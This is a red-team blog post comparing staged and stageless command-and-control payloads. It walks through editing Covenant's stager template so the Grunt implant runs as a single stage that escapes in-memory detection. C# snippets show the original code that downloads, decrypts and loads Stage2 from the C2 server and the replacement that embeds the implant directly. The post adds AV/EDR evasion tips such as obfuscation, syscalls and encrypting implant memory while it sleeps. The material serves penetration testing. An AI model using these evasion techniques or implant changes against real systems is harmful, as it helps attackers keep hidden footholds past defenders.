---
title: "Stageless HTTP in Covenant"
layout: "post"
---

This is a short post on how to use stageless HTTP Grunt's in Covenant + some staged vs stageless thoughts from my side.

<!--more-->


## Staged vs. Stageless payloads

Many Command & Control Frameworks (C2) give the user the option to generate either `staged`  or `stageless` payloads. Theese two options have different advantages and disadvantages.

For example Meterpreter, a staged payload can be generated via `windows/meterpreter/reverse_https` and stageless payloads are generated `payload windows/meterpreter_reverse_https` ("_" instead of "/").

But what does this even mean?

### Staged payloads

Staged payloads (Stage1) are small executables, that contact the C2-Server to grab a seccond payload (Stage2) from it to execute this (mostly) from memory. The advantages are:

* The executable/shellcode is small, it `only` loads a bigger payload into memory
* There are less signature possibilities for less code - less detections when dropping the first stage on disk
* If Stage1 is detected/identified/blocked, the defenders won't easily be able to analyse Stage2

Disadvantages:

* Loading Stage2 comes with additional host based and or network Indicators of Compromise (IoC's), which can lead to behavioral detections
* If you don't obfuscate the whole code base (Stage1 + Stage2) it's easy to flag Stage2 via memory scans

## Stageless payloads

Stageless payloads have everything included for the whole C2 implant to fully work and execute it's tasks. Therefore no Stage2 is loaded at all. Advantages:

* No additional host based indicators for reflective loading and no Stage2 network indicator
* Obfuscating Stage1 will care for the whole implant as there is only one Stage

Disadvantages:

* Bigger executable/shellcode
* More signature possibilities
* If detected/identified/blocked - the whole implant can be analysed by the Blue Team


## OpSec considerations

What is the best thing for your current situation? From my point of view that stronly depends on which C2 you are using and on which host or network detection systems are placed in your target environment.

Best case ideas:

* Obfuscating a whole public C2 including all stages on source code level, so that you could use the advantages of staged payloads plus having no cleartext Stage2 in memory
* Using Stageless payloads with obfuscation
* Using encrypted stageless payloads and decrypt them on runtime in memory but execute them as stealthy as possible, e.g. via syscalls in the hope, that this doesn't trigger memory scans
* Building your own C2. We are currently doing that in my company to avoid future detections. No public code, no signatures to detect malicious stuff `¯\_(ツ)_/¯` 

Optional:

* Encrypting the memory of the implant via e.g. Sleep hooks, one public example implementation is [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation) by [@mariuszbit](https://twitter.com/mariuszbit).
* Avoid RWX/RX permissions for memory pages to avoid anomalies
* If Stage1 or Stage2 makes use of Win32 API's you should port them to Syscalls

In the last months I myself was only using stageless payloads due to staged payloads getting caught more and more often. But if you want to do some [environmental keying](https://attack.mitre.org/techniques/T1480/001/) checks before loading Stage2 a staged payload may fit better.

I personally also like the idea of obfuscating a whole Open Source public C2 to avoid detections. This should apply for Stage1/Stage2 and all loaded Modules (includes Mimikatz and all other tools used). But this may be a big overhead for most people. [PlowSec](https://twitter.com/PlowSec) recently wrote a good article (actually three in a row) including an automated tool to obfuscate the meterpreter source code. [Worth reading](https://blog.scrt.ch/2022/04/19/3432/).

### Covenant & stageless payloads

Covenant comes with different protocol templates:

<p align="center">
          <img src="/assets/posts/CovenantStageless/Templates.PNG">
</p>

It is very easy to edit those templates or to build custom ones via the web application. But taking a look at all of those templates we'll see that there are only staged payloads:

<p align="center">
          <img src="/assets/posts/CovenantStageless/Staged.PNG">
</p>

From time to time when getting detected is not that relevant in a project I was lazy and did setup a fresh Covenant instance, maybe even used my [string replacements technique](https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/) created default template payloads, which I obfuscated via public or commercial obfuscators. This was really fine for some years now to not get detected by any AV/EDR. But in the recent months, more and more vendors still detected it and I wondered why.

It was the points mentioned above. I did obfuscate Stage1 but Stage2 just had some string replacements and was still detected in memory after a memory scan. That sucks.

So I thought about changing the template code to have all nessesary code in one payload directly. And it was actually pretty easy to do so and not much work. The Covenant default `StagerCode` loads Stage2 in lines 194-206, which looks like that:

```csharp

 Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
 extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
 parsed = Parse(extracted, MessageFormat);
 iv64str = parsed[3];
 message64str = parsed[4];
 hash64str = parsed[5];
 messageBytes = Convert.FromBase64String(message64str);
 if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
 SessionKey.IV = Convert.FromBase64String(iv64str);
 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
 gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });

```

Stage2 therefore is the compiled `ExecutorCode` which is loaded via `Assembly.Load` by Stage1. To build a single payload I just copied the `Grunt` class from the ExecutorCode into the `GruntStager` namespace of the `StagerCode`. You also need to import all nessesary libraries from the `ExecutorCode`.

You also need to remove the `static` declaration from the `execute` method to call it from within the `GruntStager`.

Doing so you can just replace the code from above which loads Stage2 with the following:

```csharp
Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
Grunt Stage2 = new Grunt();
Stage2.Execute(CovenantURI, CovenantCertHash, GUID, SessionKey);
```

The Stage2-Request has still to be done here, as without doing so Covenant won't register the new Grunt. You would also need to modify server side code to fully get rid of this request I guess. But we can remove the ExecutorCode, so that nothing will get served as Stage2 anyway.

Thats already it.

<p align="center">
          <img src="/assets/posts/CovenantStageless/Stageless.PNG">
</p>

The example code can be found in this [gist](https://gist.github.com/S3cur3Th1sSh1t/967927eb89b81a5519df61440357f945). Have fun playing with it.

## Conclusion

Staged vs stageless payloads. A decision to be choosen by you as operator. I mentioned some advantages and disadvantages here, but I'm also sure there are many more considerations to take for this question.

However, in the recent months I did have the need for Covenant with stageless payloads. I used some obfuscators for this one Stage and the implant was not detected again, problem solved. This may also help you if you faced similar problems in the past.

Short one. Over and out.

## Links & Resources

* Covenant [https://github.com/cobbr/Covenant](https://github.com/cobbr/Covenant)
* Shellcodefluctuation  <a href="https://github.com/mgeeky/ShellcodeFluctuation">https://github.com/mgeeky/ShellcodeFluctuation</a>
* Mitre Environmental Keying <a href="https://attack.mitre.org/techniques/T1480/001/">https://attack.mitre.org/techniques/T1480/001/</a>
* Engineering antivirus evasion (Part III) [https://blog.scrt.ch/2022/04/19/3432/](https://blog.scrt.ch/2022/04/19/3432/)
* Customizing C2 Frameworks <a href="https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/">https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/</a>
